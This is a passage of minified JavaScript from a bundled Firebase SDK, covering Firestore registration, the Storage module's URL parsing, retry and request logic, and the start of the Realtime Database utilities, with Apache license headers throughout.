`+o.stack),a}(r);throw jb("INTERNAL UNHANDLED ERROR: ",i),r}).then(r=>(this.pu=!1,r))));return this.bu=n,n}enqueueAfterDelay(e,n,r){this.Du(),this.wu.indexOf(e)>-1&&(n=0);const i=$v.createAndSchedule(this,e,n,r,s=>this.Fu(s));return this.fu.push(i),i}Du(){this.gu&&Uv()}verifyOperationInProgress(){}async Mu(){let e;do e=this.bu,await e;while(e!==this.bu)}xu(e){for(const n of this.fu)if(n.timerId===e)return!0;return!1}Ou(e){return this.Mu().then(()=>{this.fu.sort((n,r)=>n.targetTimeMs-r.targetTimeMs);for(const n of this.fu)if(n.skipDelay(),e!=="all"&&n.timerId===e)break;return this.Mu()})}Nu(e){this.wu.push(e)}Fu(e){const n=this.fu.indexOf(e);this.fu.splice(n,1)}}class tF extends Fb{constructor(e,n,r,i){super(e,n,r,i),this.type="firestore",this._queue=new nx,this._persistenceKey=(i==null?void 0:i.name)||"[DEFAULT]"}async _terminate(){if(this._firestoreClient){const e=this._firestoreClient.terminate();this._queue=new nx(e),this._firestoreClient=void 0,await e}}}function nF(t,e){const n=typeof t=="object"?t:Th(),r=typeof t=="string"?t:Bm,i=fc(n,"firestore").getImmediate({identifier:r});if(!i._initialized){const s=Tv("firestore");s&&eF(i,...s)}return i}(function(e,n=!0){(function(i){_c=i})(Qi),Li(new Rr("firestore",(r,{instanceIdentifier:i,options:s})=>{const o=r.getProvider("app").getImmediate(),a=new tF(new B4(r.getProvider("auth-internal")),new W4(o,r.getProvider("app-check-internal")),function(u,p){if(!Object.prototype.hasOwnProperty.apply(u.options,["projectId"]))throw new zt($t.INVALID_ARGUMENT,'"projectId" not provided in firebase.initializeApp.');return new Ad(u.options.projectId,p)}(o,i),o);return s=Object.assign({useFetchStreams:n},s),a._setSettings(s),a},"PUBLIC").setMultipleInstances(!0)),mn(Kw,Gw,e),mn(Kw,Gw,"esm2017")})();/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Ub="firebasestorage.googleapis.com",rF="storageBucket",iF=2*60*1e3,sF=10*60*1e3;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ar extends sr{constructor(e,n,r=0){super(ap(e),`Firebase Storage: ${n} (${ap(e)})`),this.status_=r,this.customData={serverResponse:null},this._baseMessage=this.message,Object.setPrototypeOf(this,ar.prototype)}get status(){return this.status_}set status(e){this.status_=e}_codeEquals(e){return ap(e)===this.code}get serverResponse(){return this.customData.serverResponse}set serverResponse(e){this.customData.serverResponse=e,this.customData.serverResponse?this.message=`${this._baseMessage}
${this.customData.serverResponse}`:this.message=this._baseMessage}}var rr;(function(t){t.UNKNOWN="unknown",t.OBJECT_NOT_FOUND="object-not-found",t.BUCKET_NOT_FOUND="bucket-not-found",t.PROJECT_NOT_FOUND="project-not-found",t.QUOTA_EXCEEDED="quota-exceeded",t.UNAUTHENTICATED="unauthenticated",t.UNAUTHORIZED="unauthorized",t.UNAUTHORIZED_APP="unauthorized-app",t.RETRY_LIMIT_EXCEEDED="retry-limit-exceeded",t.INVALID_CHECKSUM="invalid-checksum",t.CANCELED="canceled",t.INVALID_EVENT_NAME="invalid-event-name",t.INVALID_URL="invalid-url",t.INVALID_DEFAULT_BUCKET="invalid-default-bucket",t.NO_DEFAULT_BUCKET="no-default-bucket",t.CANNOT_SLICE_BLOB="cannot-slice-blob",t.SERVER_FILE_WRONG_SIZE="server-file-wrong-size",t.NO_DOWNLOAD_URL="no-download-url",t.INVALID_ARGUMENT="invalid-argument",t.INVALID_ARGUMENT_COUNT="invalid-argument-count",t.APP_DELETED="app-deleted",t.INVALID_ROOT_OPERATION="invalid-root-operation",t.INVALID_FORMAT="invalid-format",t.INTERNAL_ERROR="internal-error",t.UNSUPPORTED_ENVIRONMENT="unsupported-environment"})(rr||(rr={}));function ap(t){return"storage/"+t}function oF(){const t="An unknown error occurred, please check the error payload for server response.";return new ar(rr.UNKNOWN,t)}function aF(){return new ar(rr.RETRY_LIMIT_EXCEEDED,"Max retry time for operation exceeded, please try again.")}function lF(){return new ar(rr.CANCELED,"User canceled the upload/download.")}function cF(t){return new ar(rr.INVALID_URL,"Invalid URL '"+t+"'.")}function uF(t){return new ar(rr.INVALID_DEFAULT_BUCKET,"Invalid default bucket '"+t+"'.")}function rx(t){return new ar(rr.INVALID_ARGUMENT,t)}function $b(){return new ar(rr.APP_DELETED,"The Firebase app was deleted.")}function dF(t){return new ar(rr.INVALID_ROOT_OPERATION,"The operation '"+t+"' cannot be performed on a root reference, create a non-root reference using child, such as .child('file.png').")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Rn{constructor(e,n){this.bucket=e,this.path_=n}get path(){return this.path_}get isRoot(){return this.path.length===0}fullServerUrl(){const e=encodeURIComponent;return"/b/"+e(this.bucket)+"/o/"+e(this.path)}bucketOnlyServerUrl(){return"/b/"+encodeURIComponent(this.bucket)+"/o"}static makeFromBucketSpec(e,n){let r;try{r=Rn.makeFromUrl(e,n)}catch{return new Rn(e,"")}if(r.path==="")return r;throw uF(e)}static makeFromUrl(e,n){let r=null;const i="([A-Za-z0-9.\\-_]+)";function s(N){N.path.charAt(N.path.length-1)==="/"&&(N.path_=N.path_.slice(0,-1))}const o="(/(.*))?$",a=new RegExp("^gs://"+i+o,"i"),c={bucket:1,path:3};function u(N){N.path_=decodeURIComponent(N.path)}const p="v[A-Za-z0-9_]+",f=n.replace(/[.]/g,"\\."),h="(/([^?#]*).*)?$",E=new RegExp(`^https?://${f}/${p}/b/${i}/o${h}`,"i"),_={bucket:1,path:3},y=n===Ub?"(?:storage.googleapis.com|storage.cloud.google.com)":n,C="([^?#]*)",x=new RegExp(`^https?://${y}/${i}/${C}`,"i"),S=[{regex:a,indices:c,postModify:s},{regex:E,indices:_,postModify:u},{regex:x,indices:{bucket:1,path:2},postModify:u}];for(let N=0;N<S.length;N++){const R=S[N],j=R.regex.exec(e);if(j){const T=j[R.indices.bucket];let b=j[R.indices.path];b||(b=""),r=new Rn(T,b),R.postModify(r);break}}if(r==null)throw cF(e);return r}}class hF{constructor(e){this.promise_=Promise.reject(e)}getPromise(){return this.promise_}cancel(e=!1){}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function fF(t,e,n){let r=1,i=null,s=null,o=!1,a=0;function c(){return a===2}let u=!1;function p(...C){u||(u=!0,e.apply(null,C))}function f(C){i=setTimeout(()=>{i=null,t(E,c())},C)}function h(){s&&clearTimeout(s)}function E(C,...x){if(u){h();return}if(C){h(),p.call(null,C,...x);return}if(c()||o){h(),p.call(null,C,...x);return}r<64&&(r*=2);let S;a===1?(a=2,S=0):S=(r+Math.random())*1e3,f(S)}let _=!1;function y(C){_||(_=!0,h(),!u&&(i!==null?(C||(a=2),clearTimeout(i),f(0)):C||(a=1)))}return f(0),s=setTimeout(()=>{o=!0,y(!0)},n),y}function pF(t){t(!1)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function mF(t){return t!==void 0}function ix(t,e,n,r){if(r<e)throw rx(`Invalid value for '${t}'. Expected ${e} or greater.`);if(r>n)throw rx(`Invalid value for '${t}'. Expected ${n} or less.`)}function gF(t){const e=encodeURIComponent;let n="?";for(const r in t)if(t.hasOwnProperty(r)){const i=e(r)+"="+e(t[r]);n=n+i+"&"}return n=n.slice(0,-1),n}var Od;(function(t){t[t.NO_ERROR=0]="NO_ERROR",t[t.NETWORK_ERROR=1]="NETWORK_ERROR",t[t.ABORT=2]="ABORT"})(Od||(Od={}));/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function vF(t,e){const n=t>=500&&t<600,i=[408,429].indexOf(t)!==-1,s=e.indexOf(t)!==-1;return n||i||s}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class yF{constructor(e,n,r,i,s,o,a,c,u,p,f,h=!0){this.url_=e,this.method_=n,this.headers_=r,this.body_=i,this.successCodes_=s,this.additionalRetryCodes_=o,this.callback_=a,this.errorCallback_=c,this.timeout_=u,this.progressCallback_=p,this.connectionFactory_=f,this.retry=h,this.pendingConnection_=null,this.backoffId_=null,this.canceled_=!1,this.appDelete_=!1,this.promise_=new Promise((E,_)=>{this.resolve_=E,this.reject_=_,this.start_()})}start_(){const e=(r,i)=>{if(i){r(!1,new hu(!1,null,!0));return}const s=this.connectionFactory_();this.pendingConnection_=s;const o=a=>{const c=a.loaded,u=a.lengthComputable?a.total:-1;this.progressCallback_!==null&&this.progressCallback_(c,u)};this.progressCallback_!==null&&s.addUploadProgressListener(o),s.send(this.url_,this.method_,this.body_,this.headers_).then(()=>{this.progressCallback_!==null&&s.removeUploadProgressListener(o),this.pendingConnection_=null;const a=s.getErrorCode()===Od.NO_ERROR,c=s.getStatus();if(!a||vF(c,this.additionalRetryCodes_)&&this.retry){const p=s.getErrorCode()===Od.ABORT;r(!1,new hu(!1,null,p));return}const u=this.successCodes_.indexOf(c)!==-1;r(!0,new hu(u,s))})},n=(r,i)=>{const s=this.resolve_,o=this.reject_,a=i.connection;if(i.wasSuccessCode)try{const c=this.callback_(a,a.getResponse());mF(c)?s(c):s()}catch(c){o(c)}else if(a!==null){const c=oF();c.serverResponse=a.getErrorText(),this.errorCallback_?o(this.errorCallback_(a,c)):o(c)}else if(i.canceled){const c=this.appDelete_?$b():lF();o(c)}else{const c=aF();o(c)}};this.canceled_?n(!1,new hu(!1,null,!0)):this.backoffId_=fF(e,n,this.timeout_)}getPromise(){return this.promise_}cancel(e){this.canceled_=!0,this.appDelete_=e||!1,this.backoffId_!==null&&pF(this.backoffId_),this.pendingConnection_!==null&&this.pendingConnection_.abort()}}class hu{constructor(e,n,r){this.wasSuccessCode=e,this.connection=n,this.canceled=!!r}}function _F(t,e){e!==null&&e.length>0&&(t.Authorization="Firebase "+e)}function wF(t,e){t["X-Firebase-Storage-Version"]="webjs/"+(e??"AppManager")}function xF(t,e){e&&(t["X-Firebase-GMPID"]=e)}function EF(t,e){e!==null&&(t["X-Firebase-AppCheck"]=e)}function CF(t,e,n,r,i,s,o=!0){const a=gF(t.urlParams),c=t.url+a,u=Object.assign({},t.headers);return xF(u,e),_F(u,n),wF(u,s),EF(u,r),new yF(c,t.method,u,t.body,t.successCodes,t.additionalRetryCodes,t.handler,t.errorHandler,t.timeout,t.progressCallback,i,o)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function SF(t){if(t.length===0)return null;const e=t.lastIndexOf("/");return e===-1?"":t.slice(0,e)}function bF(t){const e=t.lastIndexOf("/",t.length-2);return e===-1?t:t.slice(e+1)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Dd{constructor(e,n){this._service=e,n instanceof Rn?this._location=n:this._location=Rn.makeFromUrl(n,e.host)}toString(){return"gs://"+this._location.bucket+"/"+this._location.path}_newRef(e,n){return new Dd(e,n)}get root(){const e=new Rn(this._location.bucket,"");return this._newRef(this._service,e)}get bucket(){return this._location.bucket}get fullPath(){return this._location.path}get name(){return bF(this._location.path)}get storage(){return this._service}get parent(){const e=SF(this._location.path);if(e===null)return null;const n=new Rn(this._location.bucket,e);return new Dd(this._service,n)}_throwIfRoot(e){if(this._location.path==="")throw dF(e)}}function sx(t,e){const n=e==null?void 0:e[rF];return n==null?null:Rn.makeFromBucketSpec(n,t)}function TF(t,e,n,r={}){t.host=`${e}:${n}`,t._protocol="http";const{mockUserToken:i}=r;i&&(t._overrideAuthToken=typeof i=="string"?i:Iv(i,t.app.options.projectId))}class IF{constructor(e,n,r,i,s){this.app=e,this._authProvider=n,this._appCheckProvider=r,this._url=i,this._firebaseVersion=s,this._bucket=null,this._host=Ub,this._protocol="https",this._appId=null,this._deleted=!1,this._maxOperationRetryTime=iF,this._maxUploadRetryTime=sF,this._requests=new Set,i!=null?this._bucket=Rn.makeFromBucketSpec(i,this._host):this._bucket=sx(this._host,this.app.options)}get host(){return this._host}set host(e){this._host=e,this._url!=null?this._bucket=Rn.makeFromBucketSpec(this._url,e):this._bucket=sx(e,this.app.options)}get maxUploadRetryTime(){return this._maxUploadRetryTime}set maxUploadRetryTime(e){ix("time",0,Number.POSITIVE_INFINITY,e),this._maxUploadRetryTime=e}get maxOperationRetryTime(){return this._maxOperationRetryTime}set maxOperationRetryTime(e){ix("time",0,Number.POSITIVE_INFINITY,e),this._maxOperationRetryTime=e}async _getAuthToken(){if(this._overrideAuthToken)return this._overrideAuthToken;const e=this._authProvider.getImmediate({optional:!0});if(e){const n=await e.getToken();if(n!==null)return n.accessToken}return null}async _getAppCheckToken(){if(Ut(this.app)&&this.app.settings.appCheckToken)return this.app.settings.appCheckToken;const e=this._appCheckProvider.getImmediate({optional:!0});return e?(await e.getToken()).token:null}_delete(){return this._deleted||(this._deleted=!0,this._requests.forEach(e=>e.cancel()),this._requests.clear()),Promise.resolve()}_makeStorageReference(e){return new Dd(this,e)}_makeRequest(e,n,r,i,s=!0){if(this._deleted)return new hF($b());{const o=CF(e,this._appId,r,i,n,this._firebaseVersion,s);return this._requests.add(o),o.getPromise().then(()=>this._requests.delete(o),()=>this._requests.delete(o)),o}}async makeRequestWithTokens(e,n){const[r,i]=await Promise.all([this._getAuthToken(),this._getAppCheckToken()]);return this._makeRequest(e,n,r,i).getPromise()}}const ox="@firebase/storage",ax="0.13.7";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const zb="storage";function NF(t=Th(),e){t=ft(t);const r=fc(t,zb).getImmediate({identifier:e}),i=Tv("storage");return i&&kF(r,...i),r}function kF(t,e,n,r={}){TF(t,e,n,r)}function PF(t,{instanceIdentifier:e}){const n=t.getProvider("app").getImmediate(),r=t.getProvider("auth-internal"),i=t.getProvider("app-check-internal");return new IF(n,r,i,e,Qi)}function RF(){Li(new Rr(zb,PF,"PUBLIC").setMultipleInstances(!0)),mn(ox,ax,""),mn(ox,ax,"esm2017")}RF();var lx={};const cx="@firebase/database",ux="1.0.14";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Bb="";function AF(t){Bb=t}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class OF{constructor(e){this.domStorage_=e,this.prefix_="firebase:"}set(e,n){n==null?this.domStorage_.removeItem(this.prefixedName_(e)):this.domStorage_.setItem(this.prefixedName_(e),tt(n))}get(e){const n=this.domStorage_.getItem(this.prefixedName_(e));return n==null?null:Ul(n)}remove(e){this.domStorage_.removeItem(this.prefixedName_(e))}prefixedName_(e){return this.prefix_+e}toString(){return this.domStorage_.toString()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class DF{constructor(){this.cache_={},this.isInMemoryStorage=!0}set(e,n){n==null?delete this.cache_[e]:this.cache_[e]=n}get(e){return or(this.cache_,e)?this.cache_[e]:null}remove(e){delete this.cache_[e]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Vb=function(t){try{if(typeof window<"u"&&typeof window[t]<"u"){const e=window[t];return e.setItem("firebase:sentinel","cache"),e.removeItem("firebase:sentinel"),new OF(e)}}catch{}return new DF},hs=Vb("localStorage"),jF=Vb("sessionStorage");/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const yo=new bh("@firebase/database"),MF=function(){let t=1;return function(){return t++}}(),Hb=function(t){const e=hj(t),n=new lj;n.update(e);const r=n.digest();return Sv.encodeByteArray(r)},wc=function(...t){let e="";for(let n=0;n<t.length;n++){const r=t[n];Array.isArray(r)||r&&typeof r=="object"&&typeof r.length=="number"?e+=wc.apply(null,r):typeof r=="object"?e+=tt(r):e+=r,e+=" "}return e};let dl=null,dx=!0;const LF=function(t,e){B(!e,"Can't turn on custom loggers persistently."),yo.logLevel=_e.VERBOSE,dl=yo.log.bind(yo)},ct=function(...t){if(dx===!0&&(dx=!1,dl===null&&jF.get("logging_enabled")===!0&&LF()),dl){const e=wc.apply(null,t);dl(e)}},xc=function(t){return function(...e){ct(t,...e)}},Vm=function(...t){const e="FIREBASE INTERNAL ERROR: "+wc(...t);yo.error(e)},Dr=function(...t){const e=`FIREBASE FATAL ERROR: ${wc(...t)}`;throw yo.error(e),new Error(e)},At=function(...t){const e="FIREBASE WARNING: "+wc(...t);yo.warn(e)},FF=function(){typeof window<"u"&&window.location&&window.location.protocol&&window.location.protocol.indexOf("https:")!==-1&&At("Insecure Firebase access from a secure page. Please use https in calls to new Firebase().")},zv=function(t){return typeof t=="number"&&(t!==t||t===Number.POSITIVE_INFINITY||t===Number.NEGATIVE_INFINITY)},UF=function(t){if(document.readyState==="complete")t();else{let e=!1;const n=function(){if(!document.body){setTimeout(n,Math.floor(10));return}e||(e=!0,t())};document.addEventListener?(document.addEventListener("DOMContentLoaded",n,!1),window.addEventListener("load",n,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",()=>{document.readyState==="complete"&&n()}),window.attachEvent("onload",n))}},zo="[MIN_NAME]",Is="[MAX_NAME]",Ms=function(t,e){if(t===e)return 0;if(t===zo||e===Is)return-1;if(e===zo||t===Is)return 1;{const n=hx(t),r=hx(e);return n!==null?r!==null?n-r===0?t.length-e.length:n-r:-1:r!==null?1:t<e?-1:1}},$F=function(t,e){return t===e?0:t<e?-1:1},Ba=function(t,e){if(e&&t in e)return e[t];throw new Error("Missing required key ("+t+") in object: "+tt(e))},Bv=function(t){if(typeof t!="object"||t===null)return tt(t);const e=[];for(const r in t)e.push(r);e.sort();let n="{";for(let r=0;r<e.length;r++)r!==0&&(n+=","),n+=tt(e[r]),n+=":",n+=Bv(t[e[r]]);return n+="}",n},Wb=function(t,e){const n=t.length;if(n<=e)return[t];const r=[];for(let i=0;i<n;i+=e)i+e>n?r.push(t.substring(i,n)):r.push(t.substring(i,i+e));return r};function ht(t,e){for(const n in t)t.hasOwnProperty(n)&&e(n,t[n])}const Kb=function(t){B(!zv(t),"Invalid JSON number");const e=11,n=52,r=(1<<e-1)-1;let i,s,o,a,c;t===0?(s=0,o=0,i=1/t===-1/0?1:0):(i=t<0,t=Math.abs(t),t>=Math.pow(2,1-r)?(a=Math.min(Math.floor(Math.log(t)/Math.LN2),r),s=a+r,o=Math.round(t*Math.pow(2,n-a)-Math.pow(2,n))):(s=0,o=Math.round(t/Math.pow(2,1-r-n))));const u=[];for(c=n;c;c-=1)u.push(o%2?1:0),o=Math.floor(o/2);for(c=e;c;c-=1)u.push(s%2?1:0),s=Math.floor(s/2);u.push(i?1:0),u.reverse();const p=u.join("");let f="";for(c=0;c<64;c+=8){let h=parseInt(p.substr(c,8),2).toString(16);h.length===1&&(h="0"+h),f=f+h}return f.toLowerCase()},zF=function(){return!!(typeof window=="object"&&window.chrome&&window.chrome.extension&&!/^chrome/.test(window.location.href))},BF=function(){return typeof Windows=="object"&&typeof Windows.UI=="object"};function VF(t,e){let n="Unknown Error";t==="too_big"?n="The data requested exceeds the maximum size that can be accessed with a single request.":t==="permission_denied"?n="Client doesn't have permission to access the desired data.":t==="unavailable"&&(n="The service is unavailable");const r=new Error(t+" at "+e._path.toString()+": "+n);return r.code=t.toUpperCase(),r}const HF=new RegExp("^-?(0*)\\d{1,10}$"),WF=-2147483648,KF=2147483647,hx=function(t){if(HF.test(t)){const e=Number(t);if(e>=WF&&e<=KF)return e}return null},sa=function(t){try{t()}catch(e){setTimeout(()=>{const n=e.stack||"";throw At("Exception was thrown by user callback.",n),e},Math.floor(0))}},GF=function(){return(typeof window=="object"&&window.navigator&&window.navigator.userAgent||"").search(/googlebot|google webmaster tools|bingbot|yahoo! slurp|baiduspider|yandexbot|duckduckbot/i)>=0},hl=function(t,e){const n=setTimeout(t,e);return typeof n=="number"&&typeof Deno<"u"&&Deno.unrefTimer?Deno.unrefTimer(n):typeof n=="object"&&n.unref&&n.unref(),n};/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class qF{constructor(e,n){this.appCheckProvider=n,this.appName=e.name,Ut(e)&&e.settings.appCheckToken&&(this.serverAppAppCheckToken=e.settings.appCheckToken),this.appCheck=n==null?void 0:n.getImmediate({optional:!0}),this.appCheck||n==null||n.get().then(r=>this.appCheck=r)}getToken(e){if(this.serverAppAppCheckToken){if(e)throw new Error("Attempted reuse of `FirebaseServerApp.appCheckToken` after previous usage failed.");return Promise.resolve({token:this.serverAppAppCheckToken})}return this.appCheck?this.appCheck.getToken(e):new Promise((n,r)=>{setTimeout(()=>{this.appCheck?this.getToken(e).then(n,r):n(null)},0)})}addTokenChangeListener(e){var n;(n=this.appCheckProvider)===null||n===void 0||n.get().then(r=>r.addTokenListener(e))}notifyForInvalidToken(){At(`Provided AppCheck credentials for the app named "${this.appName}" are invalid. This usually indicates your app was not initialized correctly.`)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class YF{constructor(e,n,r){this.appName_=e,this.firebaseOptions_=n,this.authProvider_=r,this.auth_=null,this.auth_=r.getImmediate({optional:!0}),this.auth_||r.onInit(i=>this.auth_=i)}getToken(e){return this.auth_?this.auth_.getToken(e).catch(n=>n&&n.code==="auth/token-not-initialized"?(ct("Got auth/token-not-initialized error.  Treating as null token."),null):Promise.reject(n)):new Promise((n,r)=>{setTimeout(()=>{this.auth_?this.getToken(e).then(n,r):n(null)},0)})}addTokenChangeListener(e){this.auth_?this.auth_.addAuthTokenListener(e):this.authProvider_.get().then(n=>n.addAuthTokenListener(e))}removeTokenChangeListener(e){this.authProvider_.get().then(n=>n.removeAuthTokenListener(e))}notifyForInvalidToken(){let e='Provided authentication credentials for the app named "'+this.appName_+'" are invalid. This usually indicates your app was not initialized correctly. ';"credential"in this.firebaseOptions_?e+='Make sure the "credential" property provided to initializeApp() is authorized to access the specified "databaseURL" and is from the correct project.':"serviceAccount"in this.firebaseOptions_?e+='Make sure the "serviceAccount" property provided to initializeApp() is authorized to access the specified "databaseURL" and is from the correct project.':e+='Make sure the "apiKey" and "databaseURL" properties provided to initializeApp() match the values provided for your app at https://console.firebase.google.com/.',At(e)}}class $u{constructor(e){this.accessToken=e}getToken(e){return Promise.resolve({accessToken:this.accessToken})}addTokenChangeListener(e){e(this.accessToken)}removeTokenChangeListener(e){}notifyForInvalidToken(){}}$u.OWNER="owner";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Vv="5",Gb="v",qb="s",Yb="r",Qb="f",Xb=/(console\.firebase|firebase-console-\w+\.corp|firebase\.corp)\.google\.com/,Jb="ls",Zb="p",Hm="ac",eT="websocket",tT="long_polling";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
